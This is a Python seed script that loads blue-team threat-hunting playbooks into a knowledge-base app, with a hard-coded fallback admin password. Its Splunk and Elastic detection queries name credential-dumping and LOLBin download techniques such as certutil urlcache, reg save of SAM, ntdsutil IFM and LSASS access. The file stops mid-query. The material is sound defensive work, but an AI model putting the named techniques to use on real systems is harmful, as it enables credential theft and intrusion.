"""
Seed Blue Team Knowledge Base articles into ION.

Creates ~100 tactical blue team articles organized into 6 collections under
the existing 'Knowledge Base' parent collection. Articles cover threat hunting
playbooks, alert investigation procedures, blue team tooling, active defense
and hardening, log analysis deep dives, and SOC analyst tradecraft.

Usage:
    cd C:\\Users\\Tomo\\ion
    C:\\Python314\\python.exe seed_knowledge_base_blueteam.py
"""
import os
import requests
import sys
import time
from io import BytesIO

BASE = os.environ.get("ION_SEED_URL", "http://127.0.0.1:8000")
SESSION = requests.Session()


def login():
    r = SESSION.post(
        f"{BASE}/api/auth/login",
        json={"username": "admin", "password": os.environ.get("ION_ADMIN_PASSWORD", "admin2025")},
    )
    r.raise_for_status()
    print("[+] Logged in as admin")


def get_or_create_collection(name, desc, parent_id=None):
    """Find existing collection by name or create a new one."""
    r = SESSION.get(f"{BASE}/api/collections")
    data = r.json()
    cols = data if isinstance(data, list) else data.get("collections", [])

    def _search(items):
        for c in items:
            if c["name"] == name:
                return c["id"]
            for child in c.get("children", []):
                if child["name"] == name:
                    return child["id"]
        return None

    found = _search(cols)
    if found:
        print(f"  Collection exists: {name} (id={found})")
        return found

    body = {"name": name, "description": desc}
    if parent_id:
        body["parent_id"] = parent_id
    r = SESSION.post(f"{BASE}/api/collections", json=body)
    if r.status_code == 400:
        print(f"  Collection may already exist: {name}")
        r2 = SESSION.get(f"{BASE}/api/collections")
        data2 = r2.json()
        cols2 = data2 if isinstance(data2, list) else data2.get("collections", [])
        found2 = _search(cols2)
        if found2:
            return found2
        return None
    r.raise_for_status()
    cid = r.json()["id"]
    print(f"  Created collection: {name} (id={cid})")
    return cid


def upload_article(title, content, tags, collection_id):
    """Upload a markdown article as a document. Skip if already exists."""
    r = SESSION.get(f"{BASE}/api/documents", params={"search": title})
    if r.status_code == 200:
        data = r.json()
        docs = data if isinstance(data, list) else data.get("documents", [])
        for d in docs:
            if d.get("name") == title:
                print(f"    Skipped (exists): {title}")
                return d["id"]
    md_bytes = BytesIO(content.encode("utf-8"))
    safe = title.replace(" ", "_").replace("/", "-").replace("&", "and")[:80]
    r = SESSION.post(
        f"{BASE}/api/documents/upload",
        files={"file": (f"{safe}.md", md_bytes, "text/markdown")},
        data={
            "name": title,
            "tags": ",".join(tags),
            "collection_id": str(collection_id),
        },
    )
    r.raise_for_status()
    doc_id = r.json()["id"]
    print(f"    Uploaded: {title} (id={doc_id})")
    return doc_id


# ============================================================
# ARTICLE CONTENT FUNCTIONS
# Each returns list of (title, tags_list, markdown_content)
# ============================================================


def threat_hunting_articles():
    """Return 18 threat hunting playbook articles for the SOC analyst knowledge base."""

    articles = []

    # ---------- Article 1 ----------
    articles.append((
        "Hunting for C2 Beacons in Proxy and Firewall Logs",
        ["threat-hunting", "c2", "proxy-logs", "network", "beaconing", "command-and-control"],
        r"""# Hunting for C2 Beacons in Proxy and Firewall Logs

## Overview

Command-and-Control (C2) beaconing is the periodic check-in an implant makes to its
operator infrastructure. Because beacons must be regular enough for an operator to
issue commands, they leave statistical fingerprints in proxy and firewall logs that
defenders can detect through frequency analysis, jitter measurement, and payload
size profiling.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1071.001 | Web Protocols | Command and Control |
| T1071.004 | DNS | Command and Control |
| T1573.001 | Encrypted Channel: Symmetric Cryptography | Command and Control |
| T1095 | Non-Application Layer Protocol | Command and Control |

## Hypothesis

Adversaries maintaining persistent access to the environment are generating
periodic outbound connections to C2 infrastructure that can be identified
through statistical analysis of connection frequency, byte-size consistency,
and destination reputation.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Web Proxy | Squid, Zscaler, Bluecoat | timestamp, src_ip, dst_ip, url, user_agent, bytes_out, bytes_in, status_code |
| Firewall | Palo Alto, Fortinet, Check Point | timestamp, src_ip, dst_ip, dst_port, bytes_sent, bytes_received, action |
| DNS | Passive DNS, DNS server logs | query, answer, query_type, src_ip, timestamp |
| NetFlow/IPFIX | Router or tap | src_ip, dst_ip, dst_port, bytes, packets, duration |

## Detection Queries

### KQL - Identify High-Frequency Beaconing (Elastic)

```kql
// Find hosts making regular connections to the same destination
// Aggregate by source-destination pair and look for high connection counts
// with low variance in inter-arrival times

proxy_logs
| where event.category == "web"
| where destination.ip != "10.0.0.0/8" AND destination.ip != "172.16.0.0/12" AND destination.ip != "192.168.0.0/16"
| stats count() as connection_count,
        min(@timestamp) as first_seen,
        max(@timestamp) as last_seen,
        avg(http.response.bytes) as avg_resp_bytes,
        stddev(http.response.bytes) as stddev_resp_bytes
  by source.ip, destination.ip, url.domain
| where connection_count > 50
| where stddev_resp_bytes < 100
| sort connection_count desc
```

### KQL - Beacon Jitter Detection (Elastic ESQL)

```kql
FROM proxy-*
| WHERE @timestamp > NOW() - 24 HOURS
| STATS count = COUNT(*),
        first = MIN(@timestamp),
        last = MAX(@timestamp)
  BY source.ip, url.domain
| WHERE count > 100
| EVAL duration_seconds = DATE_DIFF("seconds", first, last)
| EVAL avg_interval = duration_seconds / count
| WHERE avg_interval > 10 AND avg_interval < 900
| SORT count DESC
| LIMIT 50
```

### SPL - Beaconing Detection with Standard Deviation (Splunk)

```spl
index=proxy sourcetype=squid OR sourcetype=bluecoat
| eval dest_tuple=src_ip."-".dest_ip."-".dest_port
| sort 0 _time
| streamstats current=f last(_time) as prev_time by dest_tuple
| eval interval=_time-prev_time
| stats count,
        avg(interval) as avg_interval,
        stdev(interval) as stdev_interval,
        values(dest_ip) as dest_ip,
        values(src_ip) as src_ip,
        dc(src_ip) as src_count
  by dest_tuple
| where count > 50 AND stdev_interval < (avg_interval * 0.25)
| eval jitter_pct = round((stdev_interval / avg_interval) * 100, 2)
| where jitter_pct < 25
| sort - count
| table dest_tuple src_ip dest_ip count avg_interval stdev_interval jitter_pct
```

### SPL - Byte-Size Consistency Check (Splunk)

```spl
index=proxy sourcetype=squid
| stats count,
        avg(bytes_out) as avg_bytes_out,
        stdev(bytes_out) as stdev_bytes_out,
        avg(bytes_in) as avg_bytes_in,
        stdev(bytes_in) as stdev_bytes_in,
        dc(src_ip) as unique_sources
  by dest_host
| where count > 100
| where stdev_bytes_out < 50 AND stdev_bytes_in < 200
| eval out_ratio = round(stdev_bytes_out / avg_bytes_out, 4)
| eval in_ratio = round(stdev_bytes_in / avg_bytes_in, 4)
| where out_ratio < 0.1
| sort - count
```

### EQL - Periodic Process Network Connections (Elastic)

```eql
sequence by process.entity_id with maxspan=4h
  [network where event.action == "connection_attempted" and
   not cidrmatch(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")]
  [network where event.action == "connection_attempted" and
   not cidrmatch(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")]
  [network where event.action == "connection_attempted" and
   not cidrmatch(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")]
```

## Expected Results

- Hosts contacting the same external IP or domain at regular intervals (low jitter)
- Consistent request and response sizes suggesting keep-alive or polling behaviour
- User-agents that are generic, spoofed, or uncommon in the environment
- Connections to recently registered domains or IPs with low reputation scores
- Long-lived sessions with small, periodic data transfers

## Triage Steps

1. **Validate the destination**: Check the domain/IP against threat intel feeds (VirusTotal, AbuseIPDB, OTX). Check WHOIS for domain age; domains under 30 days are suspicious.
2. **Profile the source host**: Identify the user, installed software, and role. Check EDR telemetry for process-level attribution of the connections.
3. **Examine timing patterns**: Plot the connection timestamps to visualize periodicity. True beacons show clear frequency patterns even with jitter.
4. **Inspect payload sizes**: Consistent small payloads suggest polling. Occasional large responses may indicate tasking or data exfiltration.
5. **Check TLS metadata**: Examine JA3/JA4 hashes of the connections. Known C2 frameworks have published JA3 fingerprints.
6. **Correlate with EDR**: Identify the process making the connections. Legitimate software (updaters, monitoring) can mimic beaconing.
7. **Network containment**: If confirmed malicious, isolate the host, block the C2 destination at the proxy/firewall, and begin IR procedures.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| Software update checks | Known domains (windowsupdate.com, officecdn.microsoft.com), signed binaries |
| Monitoring agents (Datadog, Splunk UF) | Known agent user-agents, expected destinations |
| Cloud sync (OneDrive, Dropbox) | Authenticated sessions, known IPs, variable payload sizes |
| Health check endpoints | Internal destinations, consistent user-agents |
| Browser keep-alive | Multiple tabs create variable patterns; process is a known browser |

Build a whitelist of known periodic connections and exclude them from hunting queries
to reduce noise. Review and update the whitelist quarterly.

## Automation Opportunities

- Schedule beacon detection queries to run every 4 hours
- Feed results into a scoring model that weights jitter percentage, domain age, and TLS anomalies
- Auto-enrich destinations with threat intel and domain WHOIS data
- Create SOAR playbooks that auto-isolate hosts when C2 confidence exceeds threshold

## References

- SANS: Finding Beacons in the Dark
- Elastic: Detecting Beaconing with ES|QL
- Cobalt Strike default beacon intervals: 60s with 10% jitter
"""
    ))

    # ---------- Article 2 ----------
    articles.append((
        "Hunting for DNS-Based C2 and Data Exfiltration",
        ["threat-hunting", "dns", "c2", "data-exfiltration", "dns-tunneling", "network"],
        r"""# Hunting for DNS-Based C2 and Data Exfiltration

## Overview

DNS is one of the most commonly allowed protocols in any network, making it an
attractive channel for command-and-control communication and data exfiltration.
Adversaries encode commands and stolen data within DNS queries and responses using
techniques like DNS tunneling (iodine, dnscat2) or DNS-over-HTTPS (DoH) to bypass
traditional security controls.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1071.004 | Application Layer Protocol: DNS | Command and Control |
| T1048.001 | Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol | Exfiltration |
| T1568.002 | Dynamic Resolution: Domain Generation Algorithms | Command and Control |
| T1572 | Protocol Tunneling | Command and Control |

## Hypothesis

Threat actors are leveraging DNS as a covert communication channel by encoding
C2 instructions or exfiltrating data within DNS query names, TXT records, or
CNAME responses, generating anomalous DNS traffic patterns detectable through
query volume analysis, entropy measurement, and subdomain length profiling.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| DNS Server Logs | Windows DNS, BIND, Unbound | query_name, query_type, response_code, src_ip, answer, timestamp |
| Passive DNS | Zeek dns.log, Suricata | query, qtype, answers, rcode, id.orig_h, ts |
| EDR DNS Telemetry | CrowdStrike, Defender | DnsRequest, QueryName, QueryType, ProcessName |
| Network TAP | Zeek, Arkime | Full packet capture for payload inspection |

## Detection Queries

### KQL - High-Entropy DNS Subdomain Detection (Elastic)

```kql
dns.question.name : *
| WHERE length(dns.question.name) > 50
| EVAL subdomain = substring(dns.question.name, 0, indexOf(dns.question.name, "."))
| WHERE length(subdomain) > 30
| STATS count = COUNT(*), unique_subdomains = COUNT_DISTINCT(dns.question.name)
  BY dns.question.registered_domain, source.ip
| WHERE unique_subdomains > 50
| SORT unique_subdomains DESC
```

### KQL - Excessive DNS TXT Queries (Elastic)

```kql
event.category: "network" AND dns.question.type: "TXT"
| stats count() as txt_count by source.ip, dns.question.registered_domain
| where txt_count > 100
| sort txt_count desc
```

### SPL - DNS Tunneling Detection via Query Length and Volume (Splunk)

```spl
index=dns sourcetype=named OR sourcetype=stream:dns
| eval query_length = len(query)
| eval subdomain = mvindex(split(query, "."), 0)
| eval subdomain_length = len(subdomain)
| stats count,
        avg(query_length) as avg_qlen,
        max(query_length) as max_qlen,
        avg(subdomain_length) as avg_sublen,
        dc(query) as unique_queries,
        values(query_type) as query_types
  by src_ip, query_domain
| where count > 200 AND avg_sublen > 20
| eval ratio = round(unique_queries / count, 2)
| where ratio > 0.8
| sort - count
| table src_ip query_domain count avg_qlen avg_sublen unique_queries ratio query_types
```

### SPL - DGA Domain Detection (Splunk)

```spl
index=dns sourcetype=stream:dns
| eval domain_parts = split(query, ".")
| eval sld = mvindex(domain_parts, -2)
| eval sld_len = len(sld)
| eval has_digits = if(match(sld, "\d"), 1, 0)
| eval consonant_ratio = (len(replace(sld, "[aeiou]", "")) / sld_len)
| where sld_len > 10 AND consonant_ratio > 0.7
| stats count, dc(query) as unique_queries, values(src_ip) as sources
  by sld
| where count > 20
| sort - count
```

### EQL - Process Making Unusual DNS Requests (Elastic)

```eql
dns where process.name != "svchost.exe" and
  process.name != "chrome.exe" and
  process.name != "firefox.exe" and
  process.name != "msedge.exe" and
  dns.question.name : "*.*.*.*.*.*.?*" and
  length(dns.question.name) > 60
```

## Expected Results

- Hosts generating hundreds or thousands of unique subdomains under the same parent domain
- DNS queries with base32 or base64 encoded subdomain labels (high entropy, long strings)
- Abnormal volume of TXT, NULL, or CNAME query types from a single host
- Responses containing encoded data in TXT records or unusually long CNAME chains
- Queries to domains with very short registration age or privacy-protected WHOIS
- Processes not normally associated with DNS resolution making direct queries

## Triage Steps

1. **Identify the parent domain**: Extract the registered domain from suspicious queries. Check reputation, WHOIS age, and registrar.
2. **Analyze subdomain entropy**: Calculate Shannon entropy of the subdomain labels. Values above 3.5 bits per character are suspicious.
3. **Examine query types**: DNS tunneling tools favour TXT (iodine, dnscat2), NULL, or CNAME records for larger payload capacity.
4. **Attribute to a process**: Use EDR telemetry to identify which process is generating the DNS queries. Non-browser, non-OS processes are suspicious.
5. **Volume profiling**: Compare the query volume to a host's baseline. A jump from 200 to 5000 queries/day to a single domain is anomalous.
6. **Decode payloads**: If packet captures are available, attempt to decode the subdomain labels (base32, base64, hex) to recover plaintext C2 commands or exfiltrated data.
7. **Check for DoH/DoT**: Inspect traffic to known DoH providers (1.1.1.1, 8.8.8.8 on port 443) that bypasses internal DNS logging.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| CDN and cloud services | Domains like akamaiedge.net, cloudfront.net generate long subdomain strings but are well-known |
| DKIM and SPF lookups | Predictable format, low volume, from mail servers only |
| Anti-spam DNS blocklists | Queries to zen.spamhaus.org etc., from mail servers |
| Certificate validation (OCSP) | Queries to known CA domains, from browsers during TLS handshake |
| Antivirus cloud lookups | Known AV vendor domains, from AV processes |

Maintain an allowlist of legitimate high-volume DNS domains and exclude them from
entropy-based detections.

## Tooling for Deeper Analysis

- **freq.py** (SANS): Calculate character frequency scores for domain names
- **dnstwist**: Detect DGA and typosquatting domains
- **passivedns**: Correlate historical DNS resolutions
- **Zeek dns.log**: Rich DNS metadata including query/response timing

## References

- SANS ISC: Detecting DNS Tunneling
- Akamai: DNS Exfiltration Detection in Enterprise Networks
- iodine DNS tunnel: default uses NULL records, falls back to TXT/CNAME
- dnscat2: Uses TXT and CNAME records with base32 encoding
"""
    ))

    # ---------- Article 3 ----------
    articles.append((
        "Hunting for LOLBin Abuse (certutil, mshta, regsvr32, rundll32, bitsadmin)",
        ["threat-hunting", "lolbins", "living-off-the-land", "defense-evasion", "execution", "endpoint"],
        r"""# Hunting for LOLBin Abuse

## Overview

Living-off-the-Land Binaries (LOLBins) are legitimate, Microsoft-signed system
utilities that adversaries repurpose for malicious operations. Because these
binaries are trusted by default, their abuse frequently bypasses application
whitelisting, endpoint detection, and analyst scrutiny. This playbook covers
five of the most commonly abused LOLBins: certutil, mshta, regsvr32, rundll32,
and bitsadmin.

## MITRE ATT&CK References

| Technique ID | Name | Tactic | LOLBin |
|---|---|---|---|
| T1140 | Deobfuscate/Decode Files or Information | Defense Evasion | certutil |
| T1105 | Ingress Tool Transfer | Command and Control | certutil, bitsadmin |
| T1218.005 | System Binary Proxy Execution: Mshta | Defense Evasion | mshta |
| T1218.010 | System Binary Proxy Execution: Regsvr32 | Defense Evasion | regsvr32 |
| T1218.011 | System Binary Proxy Execution: Rundll32 | Defense Evasion | rundll32 |
| T1197 | BITS Jobs | Defense Evasion, Persistence | bitsadmin |

## Hypothesis

Adversaries present in the environment are abusing built-in Windows utilities
to download payloads, execute arbitrary code, decode encoded files, or establish
persistence while evading application control and endpoint protection.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Windows Process Creation | Sysmon Event 1, Security 4688 | process.name, process.command_line, process.parent.name, user.name |
| Windows File Creation | Sysmon Event 11 | file.path, file.name, process.name |
| Network Connection | Sysmon Event 3 | destination.ip, destination.port, process.name |
| Script Block Logging | PowerShell 4104 | ScriptBlockText |

## Detection Queries

### KQL - certutil Download and Decode Activity (Elastic)

```kql
process.name: "certutil.exe" AND
process.command_line: (*urlcache* OR *decode* OR *decodehex* OR *encode* OR *encodehex* OR *verifyctl* OR *URL*)
```

### KQL - mshta Executing Remote Content (Elastic)

```kql
process.name: "mshta.exe" AND
(process.command_line: (*http* OR *https* OR *javascript* OR *vbscript* OR *about*) OR
 process.parent.name: ("cmd.exe" OR "powershell.exe" OR "wscript.exe"))
```

### KQL - regsvr32 Squiblydoo and Squiblytwo (Elastic)

```kql
process.name: "regsvr32.exe" AND
process.command_line: (*scrobj* OR *http* OR */s* OR */u* OR */i:http* OR *scriptleturl*)
```

### KQL - bitsadmin Download or Persistence (Elastic)

```kql
process.name: "bitsadmin.exe" AND
process.command_line: (*transfer* OR *create* OR *addfile* OR *setnotifycmdline* OR *resume*)
```

### SPL - LOLBin Network Connections (Splunk)

```spl
index=sysmon EventCode=3
  (Image="*\\certutil.exe" OR Image="*\\mshta.exe" OR
   Image="*\\regsvr32.exe" OR Image="*\\rundll32.exe" OR
   Image="*\\bitsadmin.exe")
| stats count, values(DestinationIp) as dest_ips,
        values(DestinationPort) as dest_ports,
        values(User) as users
  by Image, Computer
| sort - count
```

### SPL - rundll32 Executing Unusual DLLs (Splunk)

```spl
index=sysmon EventCode=1 Image="*\\rundll32.exe"
| rex field=CommandLine "rundll32(?:\.exe)?\s+(?<dll_path>[^,]+)"
| where NOT match(dll_path, "(?i)(shell32|user32|advapi32|kernel32|ole32|shdocvw|ieframe|mshtml|url)\.dll")
| where match(dll_path, "(?i)(\\\\temp\\\\|\\\\appdata\\\\|\\\\public\\\\|\\\\downloads\\\\|http)")
| stats count by dll_path, ParentImage, User, Computer
| sort - count
```

### EQL - certutil Downloading and Executing (Elastic)

```eql
sequence by host.id with maxspan=5m
  [process where process.name == "certutil.exe" and
   process.command_line : ("*urlcache*", "*split*", "*http*")]
  [process where process.parent.name == "certutil.exe" or
   (process.name : ("cmd.exe", "powershell.exe") and
    process.command_line : ("*temp*", "*appdata*"))]
```

### EQL - mshta Spawning Suspicious Child (Elastic)

```eql
sequence by host.id with maxspan=2m
  [process where process.name == "mshta.exe" and
   process.args : ("*http*", "*javascript*", "*vbscript*")]
  [process where process.parent.name == "mshta.exe" and
   process.name : ("powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe", "rundll32.exe")]
```

## Expected Results

- certutil.exe making outbound HTTP/HTTPS connections (downloading payloads)
- certutil.exe with -decode or -decodehex flags operating on files in Temp/AppData
- mshta.exe executing inline JavaScript/VBScript or loading remote HTA files
- regsvr32.exe loading remote scriptlets via /i:http or scrobj.dll references
- rundll32.exe loading DLLs from user-writable directories (Temp, Downloads, AppData)
- bitsadmin.exe creating transfer jobs to download files from external URLs
- Any of these binaries spawning cmd.exe, powershell.exe, or wscript.exe children

## Triage Steps

1. **Review the full command line**: The command line arguments reveal intent. Look for URLs, encoded content, suspicious file paths, and obfuscation.
2. **Check the parent process**: LOLBins spawned by Office applications, script interpreters, or other LOLBins are highly suspicious.
3. **Inspect the timeline**: What happened before and after the LOLBin execution? Look for file drops, additional process spawns, and network connections.
4. **Examine dropped files**: If a file was downloaded or decoded, submit it to a sandbox or check its hash against threat intel.
5. **Verify the binary path**: Legitimate LOLBins reside in System32 or SysWOW64. Copies in unusual paths indicate masquerading.
6. **Check the user context**: LOLBins running under service accounts or SYSTEM that normally should not use them are suspicious.

## False Positive Guidance

| Binary | Common Legitimate Use |
|---|---|
| certutil | IT admins managing certificates, SCCM deployments |
| mshta | Legacy enterprise HTA applications (increasingly rare) |
| regsvr32 | Software installers registering COM objects |
| rundll32 | Control Panel applets, legitimate DLL execution |
| bitsadmin | WSUS, SCCM, Windows Update (modern systems use PowerShell BITS) |

Key differentiators for false positives:
- Legitimate use typically has DLLs from Program Files or System32, not user-writable paths
- Legitimate use rarely involves network connections to external IPs
- Parent processes for legitimate use are usually explorer.exe or services.exe
- If your environment has approved HTA apps, document and whitelist their hashes

## References

- LOLBAS Project: https://lolbas-project.github.io
- Atomic Red Team tests for each LOLBin
- MITRE ATT&CK Software entries for common threat actors using LOLBins
"""
    ))

    # ---------- Article 4 ----------
    articles.append((
        "Hunting for Persistence via Scheduled Tasks and Registry Run Keys",
        ["threat-hunting", "persistence", "scheduled-tasks", "registry", "autoruns", "endpoint"],
        r"""# Hunting for Persistence via Scheduled Tasks and Registry Run Keys

## Overview

Persistence mechanisms allow adversaries to maintain access across reboots,
credential changes, and partial remediation. Scheduled tasks and registry Run
keys are among the most prevalent persistence techniques because they are simple
to implement, difficult to distinguish from legitimate configuration, and
available on every Windows system without elevated privileges for user-level
persistence.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1053.005 | Scheduled Task/Job: Scheduled Task | Execution, Persistence, Privilege Escalation |
| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Persistence, Privilege Escalation |
| T1547.009 | Boot or Logon Autostart Execution: Shortcut Modification | Persistence |
| T1112 | Modify Registry | Defense Evasion |

## Hypothesis

An adversary who has gained initial access is establishing persistence by
creating scheduled tasks that execute malicious payloads or by adding entries
to registry Run/RunOnce keys that launch implants on user logon or system boot.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Windows Security | Event 4698 (Task Created), 4702 (Task Updated) | TaskName, TaskContent XML, SubjectUserName |
| Sysmon | Event 1 (Process Create) | process.name schtasks.exe, command_line |
| Sysmon | Event 12/13/14 (Registry) | registry.path, registry.value, process.name |
| Task Scheduler Operational | Microsoft-Windows-TaskScheduler/Operational | TaskName, ActionType, Path |
| Autoruns | Sysinternals Autoruns snapshots | Entry, ImagePath, Publisher, Enabled |

## Detection Queries

### KQL - Scheduled Task Created via schtasks.exe (Elastic)

```kql
process.name: "schtasks.exe" AND process.command_line: (*create* OR *change*) AND
NOT process.parent.name: ("msiexec.exe" OR "setup.exe" OR "CCM*.exe")
```

### KQL - Registry Run Key Modifications (Elastic)

```kql
event.category: "registry" AND
registry.path: (*\\CurrentVersion\\Run* OR *\\CurrentVersion\\RunOnce* OR
               *\\CurrentVersion\\Explorer\\Shell Folders* OR
               *\\CurrentVersion\\Explorer\\User Shell Folders*) AND
NOT process.name: ("msiexec.exe" OR "setup.exe" OR "explorer.exe" OR "OneDriveSetup.exe")
```

### SPL - New Scheduled Tasks with Suspicious Actions (Splunk)

```spl
index=wineventlog EventCode=4698
| spath input=TaskContent output=exec_command path=Task.Actions.Exec.Command
| spath input=TaskContent output=exec_args path=Task.Actions.Exec.Arguments
| where match(exec_command, "(?i)(powershell|cmd|wscript|cscript|mshta|rundll32|regsvr32)")
  OR match(exec_command, "(?i)(\\\\temp\\\\|\\\\appdata\\\\|\\\\public\\\\|\\\\programdata\\\\)")
  OR match(exec_args, "(?i)(http|base64|encodedcommand|bypass|hidden)")
| table _time, Computer, SubjectUserName, TaskName, exec_command, exec_args
```

### SPL - Registry Run Key Writes from Non-Standard Processes (Splunk)

```spl
index=sysmon (EventCode=12 OR EventCode=13 OR EventCode=14)
  TargetObject="*\\CurrentVersion\\Run*"
| where NOT match(Image, "(?i)(explorer\.exe|msiexec\.exe|setup\.exe|chrome_installer)")
| eval binary_in_value = if(match(Details, "(?i)(powershell|cmd|wscript|cscript|rundll32|mshta|\\\\temp\\\\|\\\\appdata\\\\)"), "suspicious", "review")
| stats count by Image, TargetObject, Details, binary_in_value, Computer, User
| sort - count
```

### EQL - Schtasks Creating Tasks Pointing to Writable Directories (Elastic)

```eql
process where process.name == "schtasks.exe" and
  process.args : "/create" and
  process.args : ("*\\Temp\\*", "*\\AppData\\*", "*\\ProgramData\\*",
                  "*\\Public\\*", "*\\Downloads\\*", "*powershell*",
                  "*cmd /c*", "*http*", "*base64*")
```

### EQL - Persistence Followed by Execution (Elastic)

```eql
sequence by host.id with maxspan=24h
  [registry where
    registry.path : "*\\CurrentVersion\\Run*" and
    registry.data.strings : ("*\\Temp\\*", "*\\AppData\\*", "*powershell*")]
  [process where event.action == "start" and
    process.executable : ("*\\Temp\\*", "*\\AppData\\*")]
```

## Expected Results

- Scheduled tasks created by schtasks.exe, not via Group Policy or SCCM, pointing to non-standard paths
- Tasks with actions executing PowerShell, cmd, wscript, or other script interpreters
- Tasks with encoded commands, hidden windows, or bypass flags in arguments
- Registry Run key entries pointing to executables in Temp, AppData, ProgramData, or Public
- Registry modifications made by processes that do not normally write to Run keys
- Tasks scheduled to run at logon, idle, or at frequent intervals such as every 5-15 minutes

## Triage Steps

1. **Examine the task or registry entry**: What binary does it point to? What arguments are passed? Is the path user-writable?
2. **Verify the binary**: Check the hash against threat intel. Verify the digital signature. Examine PE metadata.
3. **Identify who created it**: Check SubjectUserName in Event 4698 or the process that wrote the registry key.
4. **Check the timeline**: When was it created? Does it correlate with other suspicious events such as initial access or lateral movement?
5. **Determine scope**: Search for the same task name or registry entry across all hosts. Persistence on multiple hosts suggests automated deployment.
6. **Compare against baseline**: Use Sysinternals Autoruns snapshots to compare current persistence entries against a known-good baseline.
7. **Remediate**: Remove the task or registry entry, quarantine the referenced binary, and check for additional persistence mechanisms.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| Software installers (MSI, Setup) | Parent process is msiexec.exe or setup.exe; entry points to Program Files |
| Group Policy deployed tasks | Created by svchost.exe or gpupdate.exe; task XML references GPO |
| SCCM/Intune agent tasks | Created by CcmExec.exe; task paths reference CCM directories |
| Browser auto-update tasks | Named GoogleUpdate or MozillaUpdate; point to signed updater binaries |
| User-configured tasks | Legitimate user tools like backup software; validate with the user |

## Periodic Baselining

Run Sysinternals Autoruns across all endpoints weekly and diff against previous
snapshots. New entries that are unsigned, point to user-writable paths, or were
not deployed by IT are high-priority for investigation.

## Common Persistence Locations

| Location | Scope | Requires Admin |
|---|---|---|
| HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Per-user, survives reboot | No |
| HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | All users, survives reboot | Yes |
| HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce | Per-user, single execution | No |
| HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce | All users, single execution | Yes |
| %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup | Per-user startup folder | No |
| C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup | All users startup folder | Yes |
| Scheduled Task (user context) | Per-user, flexible triggers | No |
| Scheduled Task (SYSTEM context) | System-wide, flexible triggers | Yes |

## Automation Opportunities

- Deploy osquery or Velociraptor queries to enumerate all scheduled tasks and
  registry Run keys across the fleet on a daily schedule
- Feed results into a diff engine that compares against the previous day's snapshot
- Auto-enrich new entries with VirusTotal hash lookups and signature validation
- Create SOAR playbooks that open investigation tickets for unsigned new entries
- Schedule Autoruns collection via GPO and centralize results for analysis

## References

- Sysinternals Autoruns: comprehensive persistence enumeration
- MITRE ATT&CK Persistence techniques matrix
- Microsoft documentation on Task Scheduler security hardening
- Velociraptor: Windows persistence artifact collection
"""
    ))

    # ---------- Article 5 ----------
    articles.append((
        "Hunting for Credential Dumping (LSASS, SAM, NTDS.dit)",
        ["threat-hunting", "credential-dumping", "lsass", "mimikatz", "credential-access", "endpoint"],
        r"""# Hunting for Credential Dumping (LSASS, SAM, NTDS.dit)

## Overview

Credential dumping is a critical step in most intrusions. Adversaries extract
authentication material including plaintext passwords, NTLM hashes, and Kerberos
tickets from memory (LSASS), the local Security Account Manager (SAM) database,
or the Active Directory database (NTDS.dit) on domain controllers. Detecting
these activities early can prevent lateral movement and full domain compromise.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1003.001 | OS Credential Dumping: LSASS Memory | Credential Access |
| T1003.002 | OS Credential Dumping: Security Account Manager | Credential Access |
| T1003.003 | OS Credential Dumping: NTDS | Credential Access |
| T1003.006 | OS Credential Dumping: DCSync | Credential Access |
| T1550.002 | Use Alternate Authentication Material: Pass the Hash | Lateral Movement |

## Hypothesis

An adversary with local administrator or domain admin privileges is extracting
credentials from LSASS process memory, the SAM registry hive, or the NTDS.dit
file on domain controllers to obtain authentication material for lateral
movement and privilege escalation.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Sysmon | Event 10 (Process Access) | SourceImage, TargetImage, GrantedAccess |
| Sysmon | Event 1 (Process Create) | process.name, command_line, parent |
| Sysmon | Event 11 (File Create) | TargetFilename, Image |
| Windows Security | Event 4662 (AD Object Access) | Properties for DCSync detection |
| Windows Security | Event 4663 (File Access) | ObjectName, ProcessName |
| EDR Telemetry | Process injection, handle events | source_process, target_process, access_mask |

## Detection Queries

### KQL - LSASS Memory Access by Non-Standard Processes (Elastic)

```kql
event.code: "10" AND
winlog.event_data.TargetImage: "*\\lsass.exe" AND
NOT winlog.event_data.SourceImage: (
  "*\\csrss.exe" OR "*\\wininit.exe" OR "*\\wmiprvse.exe" OR
  "*\\svchost.exe" OR "*\\MsMpEng.exe" OR "*\\MsSense.exe" OR
  "*\\CrowdStrike\\*" OR "*\\SentinelOne\\*" OR "*\\Carbon Black\\*"
) AND
winlog.event_data.GrantedAccess: ("0x1010" OR "0x1410" OR "0x1438" OR "0x143a" OR "0x1fffff")
```

### KQL - SAM Hive Dumping via reg.exe or esentutl (Elastic)

```kql
process.name: ("reg.exe" OR "esentutl.exe") AND
process.command_line: (*save* AND (*sam* OR *security* OR *system*)) OR
process.command_line: (*copy* AND *\\config\\SAM*)
```

### KQL - NTDS.dit Access via ntdsutil or Volume Shadow Copy (Elastic)

```kql
(process.name: "ntdsutil.exe" AND process.command_line: (*ifm* OR *"install from media"*)) OR
